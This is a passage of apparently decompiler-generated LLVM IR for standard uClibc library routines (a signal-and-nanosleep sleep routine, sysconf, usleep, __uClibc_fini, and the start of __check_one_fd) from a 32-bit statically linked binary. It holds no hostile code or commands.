  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805186e

dec_label_pc_805186e:                             ; preds = %dec_label_pc_805186e.dec_label_pc_805186e_crit_edge, %dec_label_pc_8051879.preheader
  %v0_805186e = phi i32 [ %v15_80517e5, %dec_label_pc_8051879.preheader ], [ %v0_805186e.pre, %dec_label_pc_805186e.dec_label_pc_805186e_crit_edge ]
  %v1_805187926 = phi i32 [ 31, %dec_label_pc_8051879.preheader ], [ %v1_8051879, %dec_label_pc_805186e.dec_label_pc_805186e_crit_edge ]
  %v2_805186e = mul i32 %v1_805187926, 4
  %v3_805186e = add i32 %v2_805186e, 292
  %v4_805186e = add i32 %v3_805186e, %v0_805186e
  %v5_805186e = inttoptr i32 %v4_805186e to i32*
  store i32 0, i32* %v5_805186e, align 4
  %v0_8051879.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8051879 = add i32 %v0_8051879.pre, -1
  %v9_8051879 = icmp slt i32 %v1_8051879, 0
  store i32 %v1_8051879, i32* %edx.global-to-local, align 4
  %v1_805187a = icmp eq i1 %v9_8051879, false
  br i1 %v1_805187a, label %dec_label_pc_805186e.dec_label_pc_805186e_crit_edge, label %dec_label_pc_805187c

dec_label_pc_805186e.dec_label_pc_805186e_crit_edge: ; preds = %dec_label_pc_805186e
  %v0_805186e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805186e

dec_label_pc_805187c:                             ; preds = %dec_label_pc_805186e
  store i32 %v2_805181f, i32* %eax.global-to-local, align 4
  store i32 %v2_805181f, i32* %stack_var_-460, align 4
  %v4_8051888 = call i32 @__sigaddset(i32 %v2_805181f, i32 17, i32 0, i32 0)
  store i32 %v4_8051888, i32* %eax.global-to-local, align 4
  %v2_8051890 = icmp slt i32 %v4_8051888, 0
  br i1 %v2_8051890, label %dec_label_pc_8051957, label %dec_label_pc_8051898

dec_label_pc_8051898:                             ; preds = %dec_label_pc_805187c
  %v2_8051899 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8051899, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80518a2 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8051899)
  store i32 %v4_80518a2, i32* %eax.global-to-local, align 4
  %v2_80518aa = icmp slt i32 %v4_80518a2, 0
  %v1_80518ac = icmp eq i1 %v2_80518aa, false
  br i1 %v1_80518ac, label %dec_label_pc_80518d6, label %dec_label_pc_80518ae

dec_label_pc_80518ae:                             ; preds = %dec_label_pc_8051898
  %v0_80518ae = load i32, i32* %stack_var_-460, align 4
  %v1_80518ae = call i32 @__errno_location(i32 %v0_80518ae)
  store i32 %v1_80518ae, i32* %eax.global-to-local, align 4
  %v1_80518b3 = inttoptr i32 %v1_80518ae to i32*
  %v2_80518b3 = load i32, i32* %v1_80518b3, align 4
  store i32 %v2_80518b3, i32* @esi, align 4
  store i32 %v1_80518ae, i32* @ebx, align 4
  store i32 %v2_8051838, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80518c4 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80518c4 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80518c4, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80518cf = load i32, i32* @esi, align 4
  %v1_80518cf = load i32, i32* @ebx, align 4
  %v2_80518cf = inttoptr i32 %v1_80518cf to i32*
  store i32 %v0_80518cf, i32* %v2_80518cf, align 4
  %v0_8051964.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805195a

dec_label_pc_80518d6:                             ; preds = %dec_label_pc_8051898
  %v3_80518d6 = load i32, i32* %stack_var_-420, align 4
  %v12_80518d6 = icmp eq i32 %v3_80518d6, 1
  %v2_80518e2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80518e2, i32* @ebx, align 4
  %v1_80518e9 = icmp eq i1 %v12_80518d6, false
  br i1 %v1_80518e9, label %dec_label_pc_8051910, label %dec_label_pc_80518eb

dec_label_pc_80518eb:                             ; preds = %dec_label_pc_80518d6
  store i32 %v2_80518e2, i32* %stack_var_-460, align 4
  %v2_80518ef = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80518ef = call i32 @__libc_nanosleep(%timespec* %v2_80518ef, i32 %v2_80518e2)
  store i32 %v3_80518ef, i32* %eax.global-to-local, align 4
  store i32 %v3_80518ef, i32* @edi, align 4
  %v1_80518f6 = call i32 @__errno_location(i32 %v2_80518e2)
  store i32 %v1_80518f6, i32* %eax.global-to-local, align 4
  %v1_80518fe = inttoptr i32 %v1_80518f6 to i32*
  %v2_80518fe = load i32, i32* %v1_80518fe, align 4
  store i32 %v2_80518fe, i32* @esi, align 4
  store i32 %v1_80518f6, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051907 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051907 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051907, i32 0)
  store i32 %v4_8051907, i32* %eax.global-to-local, align 4
  %v0_805190c = load i32, i32* @esi, align 4
  %v1_805190c = load i32, i32* @ebx, align 4
  %v2_805190c = inttoptr i32 %v1_805190c to i32*
  store i32 %v0_805190c, i32* %v2_805190c, align 4
  %v0_8051936.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051933

dec_label_pc_8051910:                             ; preds = %dec_label_pc_80518d6
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051916 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051916 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051916, i32 0)
  store i32 %v4_8051916, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805192c

dec_label_pc_8051921:                             ; preds = %dec_label_pc_8051853
  %v2_8051923 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051923, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805192c

dec_label_pc_805192c:                             ; preds = %dec_label_pc_8051910, %dec_label_pc_8051921
  %storemerge3.pre-phi = phi i32 [ %v2_80518e2, %dec_label_pc_8051910 ], [ %v2_8051923, %dec_label_pc_8051921 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_805192c = bitcast i32* %stack_var_-24 to %timespec*
  %v3_805192c = call i32 @__libc_nanosleep(%timespec* %v2_805192c, i32 %storemerge3.pre-phi)
  store i32 %v3_805192c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051933

dec_label_pc_8051933:                             ; preds = %dec_label_pc_80518eb, %dec_label_pc_805192c
  %v0_8051936 = phi i32 [ %v0_8051936.pre, %dec_label_pc_80518eb ], [ %v3_805192c, %dec_label_pc_805192c ]
  %v1_8051936 = icmp eq i32 %v0_8051936, 0
  br i1 %v1_8051936, label %dec_label_pc_8051953, label %dec_label_pc_805193a

dec_label_pc_805193a:                             ; preds = %dec_label_pc_8051933
  %v4_805194a = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_805194a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805195a

dec_label_pc_8051953:                             ; preds = %entry, %dec_label_pc_8051933
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805195a

dec_label_pc_8051957:                             ; preds = %dec_label_pc_805187c, %dec_label_pc_8051837, %dec_label_pc_8051809
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805195a

dec_label_pc_805195a:                             ; preds = %dec_label_pc_8051953, %dec_label_pc_805193a, %dec_label_pc_80518ae, %dec_label_pc_8051957
  %v0_8051964 = phi i32 [ 0, %dec_label_pc_8051953 ], [ %v4_805194a, %dec_label_pc_805193a ], [ %v0_8051964.pre, %dec_label_pc_80518ae ], [ -1, %dec_label_pc_8051957 ]
  store i32 %v0_80517e4, i32* @ebx, align 4
  store i32 %v0_80517e3, i32* @esi, align 4
  store i32 %v0_80517e2, i32* @edi, align 4
  ret i32 %v0_8051964

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_80518f6, { 1, 0, 2 }
  uselistorder i32 %v2_80518e2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8051879, { 2, 1, 0 }
  uselistorder i32 %v2_8051838, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_805181f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8051806, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805195a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051953, { 1, 0 }
  uselistorder label %dec_label_pc_8051933, { 1, 0 }
  uselistorder label %dec_label_pc_805192c, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8051987 [
    i32 0, label %dec_label_pc_8051997
    i32 1, label %dec_label_pc_8051a7c
    i32 2, label %dec_label_pc_80519a1
    i32 3, label %dec_label_pc_80519ab
    i32 4, label %dec_label_pc_80519b5
    i32 5, label %dec_label_pc_8051a4b
    i32 6, label %dec_label_pc_80519bd
    i32 7, label %dec_label_pc_805197d
    i32 8, label %dec_label_pc_805197d
    i32 9, label %dec_label_pc_805197d
    i32 10, label %dec_label_pc_805197d
    i32 11, label %dec_label_pc_805197d
    i32 12, label %dec_label_pc_805197d
    i32 13, label %dec_label_pc_805197d
    i32 14, label %dec_label_pc_805197d
    i32 15, label %dec_label_pc_805197d
    i32 16, label %dec_label_pc_805197d
    i32 17, label %dec_label_pc_805197d
    i32 18, label %dec_label_pc_805197d
    i32 19, label %dec_label_pc_805197d
    i32 20, label %dec_label_pc_805197d
    i32 21, label %dec_label_pc_805197d
    i32 22, label %dec_label_pc_805197d
    i32 23, label %dec_label_pc_8051a7c
    i32 24, label %dec_label_pc_8051a7c
    i32 25, label %dec_label_pc_8051a88
    i32 26, label %dec_label_pc_8051a59
    i32 27, label %dec_label_pc_8051a7c
    i32 28, label %dec_label_pc_80519cf
    i32 29, label %dec_label_pc_8051a52
    i32 30, label %dec_label_pc_80519c7
    i32 31, label %dec_label_pc_8051a67
    i32 32, label %dec_label_pc_8051a7c
    i32 33, label %dec_label_pc_8051a7c
    i32 34, label %dec_label_pc_8051a7c
    i32 35, label %dec_label_pc_8051a60
    i32 36, label %dec_label_pc_8051a8f
    i32 37, label %dec_label_pc_8051a96
    i32 38, label %dec_label_pc_8051a8f
    i32 39, label %dec_label_pc_80519d9
    i32 40, label %dec_label_pc_8051a9d
    i32 41, label %dec_label_pc_8051a7c
    i32 42, label %dec_label_pc_8051a67
    i32 43, label %dec_label_pc_8051a96
    i32 44, label %dec_label_pc_8051aa4
    i32 45, label %dec_label_pc_8051a96
    i32 46, label %dec_label_pc_8051a52
    i32 47, label %dec_label_pc_8051a52
    i32 48, label %dec_label_pc_8051a52
    i32 49, label %dec_label_pc_8051a7c
    i32 50, label %dec_label_pc_8051a7c
    i32 51, label %dec_label_pc_8051a52
    i32 52, label %dec_label_pc_8051a52
    i32 53, label %dec_label_pc_8051a7c
    i32 54, label %dec_label_pc_8051a7c
    i32 55, label %dec_label_pc_8051a7c
    i32 56, label %dec_label_pc_8051a7c
    i32 57, label %dec_label_pc_8051a7c
    i32 58, label %dec_label_pc_8051a7c
    i32 59, label %dec_label_pc_8051a7c
    i32 60, label %dec_label_pc_8051a7c
    i32 61, label %dec_label_pc_8051a7c
    i32 62, label %dec_label_pc_8051a7c
    i32 63, label %dec_label_pc_8051a7c
    i32 64, label %dec_label_pc_8051a7c
    i32 65, label %dec_label_pc_8051a7c
    i32 66, label %dec_label_pc_8051a7c
    i32 67, label %dec_label_pc_805197d
    i32 68, label %dec_label_pc_805197d
    i32 69, label %dec_label_pc_8051a60
    i32 70, label %dec_label_pc_8051a60
    i32 71, label %dec_label_pc_8051a60
    i32 72, label %dec_label_pc_8051a67
    i32 73, label %dec_label_pc_8051a6e
    i32 74, label %dec_label_pc_8051a75
    i32 75, label %dec_label_pc_80519e3
    i32 76, label %dec_label_pc_8051a75
    i32 77, label %dec_label_pc_805197d
    i32 78, label %dec_label_pc_805197d
    i32 79, label %dec_label_pc_805197d
    i32 80, label %dec_label_pc_805197d
    i32 81, label %dec_label_pc_805197d
    i32 82, label %dec_label_pc_805197d
    i32 83, label %dec_label_pc_805197d
    i32 84, label %dec_label_pc_805197d
    i32 85, label %dec_label_pc_8051a7c
    i32 86, label %dec_label_pc_8051a7c
    i32 87, label %dec_label_pc_8051a59
    i32 88, label %dec_label_pc_80519ed
    i32 89, label %dec_label_pc_80519f7
    i32 90, label %dec_label_pc_8051a6e
    i32 91, label %dec_label_pc_805197d
    i32 92, label %dec_label_pc_805197d
    i32 93, label %dec_label_pc_805197d
    i32 94, label %dec_label_pc_805197d
    i32 95, label %dec_label_pc_8051a52
    i32 96, label %dec_label_pc_8051a7c
    i32 97, label %dec_label_pc_8051a7c
    i32 98, label %dec_label_pc_805197d
    i32 99, label %dec_label_pc_805197d
    i32 100, label %dec_label_pc_805197d
    i32 101, label %dec_label_pc_8051a01
    i32 102, label %dec_label_pc_8051a44
    i32 103, label %dec_label_pc_8051a81
    i32 104, label %dec_label_pc_8051a59
    i32 105, label %dec_label_pc_8051a0b
    i32 106, label %dec_label_pc_8051a67
    i32 107, label %dec_label_pc_8051a67
    i32 108, label %dec_label_pc_8051a4b
    i32 109, label %dec_label_pc_8051a88
    i32 110, label %dec_label_pc_8051aa4
    i32 111, label %dec_label_pc_8051a44
    i32 112, label %dec_label_pc_8051a81
    i32 113, label %dec_label_pc_8051aa4
    i32 114, label %dec_label_pc_8051a15
    i32 115, label %dec_label_pc_8051a9d
    i32 116, label %dec_label_pc_8051a7c
    i32 117, label %dec_label_pc_8051a7c
    i32 118, label %dec_label_pc_8051a1f
    i32 119, label %dec_label_pc_8051a29
    i32 120, label %dec_label_pc_8051a96
    i32 121, label %dec_label_pc_8051a59
    i32 122, label %dec_label_pc_8051a59
    i32 123, label %dec_label_pc_8051a59
    i32 124, label %dec_label_pc_8051a59
    i32 125, label %dec_label_pc_805197d
    i32 126, label %dec_label_pc_805197d
    i32 127, label %dec_label_pc_8051a7c
    i32 128, label %dec_label_pc_8051a7c
    i32 129, label %dec_label_pc_805197d
    i32 130, label %dec_label_pc_805197d
    i32 131, label %dec_label_pc_8051a7c
    i32 149, label %dec_label_pc_8051a30
  ]

dec_label_pc_805197d:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051987:                             ; preds = %entry
  %v1_8051987 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805198c = inttoptr i32 %v1_8051987 to i32*
  store i32 22, i32* %v1_805198c, align 4
  br label %dec_label_pc_8051a7c

dec_label_pc_8051997:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_80519a1:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_80519ab:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_80519b5:                             ; preds = %entry
  %v0_80519b8 = call i32 @getdtablesize()
  br label %dec_label_pc_80519bd

dec_label_pc_80519bd:                             ; preds = %entry, %dec_label_pc_80519b5
  br label %dec_label_pc_8051aa9

dec_label_pc_80519c7:                             ; preds = %entry
  %v3_80519ca = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80519cf

dec_label_pc_80519cf:                             ; preds = %entry, %dec_label_pc_80519c7
  br label %dec_label_pc_8051aa9

dec_label_pc_80519d9:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_80519e3:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_80519ed:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_80519f7:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a01:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a0b:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a15:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a1f:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a29:                             ; preds = %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a30:                             ; preds = %entry
  %v5_8051a36 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8051a3e = icmp slt i32 %v5_8051a36, 0
  %v1_8051a40 = icmp eq i1 %v2_8051a3e, false
  br i1 %v1_8051a40, label %dec_label_pc_8051a52, label %dec_label_pc_8051a7c

dec_label_pc_8051a44:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a4b:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a52:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8051a30
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a59:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a60:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a67:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a6e:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a75:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a7c:                             ; preds = %dec_label_pc_8051a30, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8051987
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a81:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a88:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a8f:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a96:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051a9d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051aa4:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8051aa9

dec_label_pc_8051aa9:                             ; preds = %dec_label_pc_8051a9d, %dec_label_pc_8051a96, %dec_label_pc_8051a8f, %dec_label_pc_8051a88, %dec_label_pc_8051a81, %dec_label_pc_8051a75, %dec_label_pc_8051a6e, %dec_label_pc_8051a67, %dec_label_pc_8051a60, %dec_label_pc_8051a59, %dec_label_pc_8051a4b, %dec_label_pc_8051a44, %dec_label_pc_8051a52, %dec_label_pc_8051a29, %dec_label_pc_8051a1f, %dec_label_pc_8051a15, %dec_label_pc_8051a0b, %dec_label_pc_8051a01, %dec_label_pc_80519f7, %dec_label_pc_80519ed, %dec_label_pc_80519e3, %dec_label_pc_80519d9, %dec_label_pc_80519cf, %dec_label_pc_80519bd, %dec_label_pc_80519ab, %dec_label_pc_80519a1, %dec_label_pc_8051997, %dec_label_pc_805197d, %dec_label_pc_8051a7c, %dec_label_pc_8051aa4
  %v0_8051aac = phi i32 [ 255, %dec_label_pc_8051a9d ], [ 2048, %dec_label_pc_8051a96 ], [ 99, %dec_label_pc_8051a8f ], [ 20, %dec_label_pc_8051a88 ], [ -128, %dec_label_pc_8051a81 ], [ 1024, %dec_label_pc_8051a75 ], [ 4, %dec_label_pc_8051a6e ], [ 32, %dec_label_pc_8051a67 ], [ 256, %dec_label_pc_8051a60 ], [ 2147483647, %dec_label_pc_8051a59 ], [ 16, %dec_label_pc_8051a4b ], [ 127, %dec_label_pc_8051a44 ], [ 200112, %dec_label_pc_8051a52 ], [ 9, %dec_label_pc_8051a29 ], [ 65535, %dec_label_pc_8051a1f ], [ -32768, %dec_label_pc_8051a15 ], [ -2147483648, %dec_label_pc_8051a0b ], [ 8, %dec_label_pc_8051a01 ], [ 500, %dec_label_pc_80519f7 ], [ 4096, %dec_label_pc_80519ed ], [ 16384, %dec_label_pc_80519e3 ], [ 1000, %dec_label_pc_80519d9 ], [ 32768, %dec_label_pc_80519cf ], [ 6, %dec_label_pc_80519bd ], [ 65536, %dec_label_pc_80519ab ], [ 100, %dec_label_pc_80519a1 ], [ 131072, %dec_label_pc_8051997 ], [ 1, %dec_label_pc_805197d ], [ -1, %dec_label_pc_8051a7c ], [ 32767, %dec_label_pc_8051aa4 ]
  ret i32 %v0_8051aac

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 2, 0, 1, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 4, 1, 2, 3 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 65, { 2, 1, 0 }
  uselistorder i32 50, { 1, 0 }
  uselistorder i32 49, { 3, 2, 0, 1 }
  uselistorder i32 39, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 7, 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 19, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051aa9, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8051a7c, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8051a52, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80519cf, { 1, 0 }
  uselistorder label %dec_label_pc_80519bd, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v4_8051ab8 = trunc i64 %arg1 to i32
  %div = udiv i32 %v4_8051ab8, 1000000
  store i32 %div, i32* %stack_var_-8, align 4
  %v2_8051ad7 = bitcast i32* %stack_var_-8 to %timespec*
  %v3_8051ad7 = call i32 @__libc_nanosleep(%timespec* %v2_8051ad7, i32 0)
  ret i32 %v3_8051ad7

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
  uselistorder i32 1000000, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ae0 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ae0, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32 0), label %dec_label_pc_8051af4, label %dec_label_pc_8051b01

dec_label_pc_8051af4:                             ; preds = %entry, %dec_label_pc_8051af4
  %v1_8051afb6 = phi i32 [ %v1_8051afb, %dec_label_pc_8051af4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80596a8.221 to i32), i32 -134583976), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8051afb.222 to i32), i32* %stack_var_-16, align 4
  %v5_8051af4 = mul i32 %v1_8051afb6, 4
  %v6_8051af4 = add i32 %v5_8051af4, ptrtoint (i32* @global_var_80596a8.221 to i32)
  %v7_8051af4 = inttoptr i32 %v6_8051af4 to i32*
  %v8_8051af4 = load i32, i32* %v7_8051af4, align 4
  call void @__pseudo_call(i32 %v8_8051af4)
  %v0_8051afb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051afb = add i32 %v0_8051afb.pre, -1
  store i32 %v1_8051afb, i32* %ebx.global-to-local, align 4
  %v10_8051afc = icmp eq i32 %v0_8051afb.pre, 0
  %v1_8051aff = icmp eq i1 %v10_8051afc, false
  br i1 %v1_8051aff, label %dec_label_pc_8051af4, label %dec_label_pc_8051b01

dec_label_pc_8051b01:                             ; preds = %dec_label_pc_8051af4, %entry
  %v0_8051b01 = load i32, i32* @global_var_80602d4.223, align 4
  %v1_8051b06 = icmp eq i32 %v0_8051b01, 0
  br i1 %v1_8051b06, label %dec_label_pc_8051b0c, label %dec_label_pc_8051b0a

dec_label_pc_8051b0a:                             ; preds = %dec_label_pc_8051b01
  %v0_8051b0a = load i32, i32* %stack_var_-16, align 4
  %v1_8051b0a = call i32 @unknown_0(i32 %v0_8051b0a)
  br label %dec_label_pc_8051b0c

dec_label_pc_8051b0c:                             ; preds = %dec_label_pc_8051b0a, %dec_label_pc_8051b01
  %v0_8051b0c = load i32, i32* @global_var_80602d8.224, align 8
  %v1_8051b12 = icmp eq i32 %v0_8051b0c, 0
  br i1 %v1_8051b12, label %dec_label_pc_8051b1b, label %dec_label_pc_8051b16

dec_label_pc_8051b16:                             ; preds = %dec_label_pc_8051b0c
  %v2_8051b18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051b18, i32* %ebx.global-to-local, align 4
  %v0_8051b19 = load i32, i32* %stack_var_-16, align 4
  %v1_8051b19 = call i32 @unknown_0(i32 %v0_8051b19)
  br label %dec_label_pc_8051b1b

dec_label_pc_8051b1b:                             ; preds = %dec_label_pc_8051b0c, %dec_label_pc_8051b16
  %v2_8051b1b = load i32, i32* %stack_var_-16, align 4
  %v2_8051b1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b1c, i32* @edx, align 4
  ret i32 %v2_8051b1b

; uselistorder directives
  uselistorder i32 %v1_8051afb, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051b1b, { 1, 0 }
  uselistorder label %dec_label_pc_8051af4, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8051b22 = load i32, i32* @eax, align 4
  ret i32 %v0_8051b22
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051b23 = load i32, i32* @esi, align 4
  %v0_8051b24 = load i32, i32* @eax, align 4
  store i32 %v0_8051b24, i32* @esi, align 4
  %v0_8051b26 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b26, i32* %stack_var_-8, align 4
  %v0_8051b27 = load i32, i32* @edx, align 4
  store i32 %v0_8051b27, i32* @ebx, align 4
  %v4_8051b2f = call i32 @__libc_fcntl(i32 %v0_8051b24, i32 1, i32 %tmp6)
  %v8_8051b37 = icmp eq i32 %v4_8051b2f, -1
  %v1_8051b38 = icmp eq i1 %v8_8051b37, false
  br i1 %v1_8051b38, label %dec_label_pc_8051b53, label %dec_label_pc_8051b3a

dec_label_pc_8051b3a:                             ; preds = %entry
  %v0_8051b3c = load i32, i32* @ebx, align 4
  %v5_8051b42 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058220.225, i32 0, i32 0), i32 %v0_8051b3c)
